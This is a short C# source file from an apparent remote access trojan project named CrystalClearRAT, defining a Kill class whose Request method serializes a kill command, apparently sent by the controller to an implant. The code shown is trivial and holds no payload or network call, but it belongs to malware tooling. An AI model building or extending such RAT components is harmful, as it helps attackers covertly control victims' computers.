using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Functions
{
    public static class Kill
    {

        public static byte[] Request()
        {
            return CommandDataSerializer.Serialize(CommandFlags.Kill);
        }

    }
}
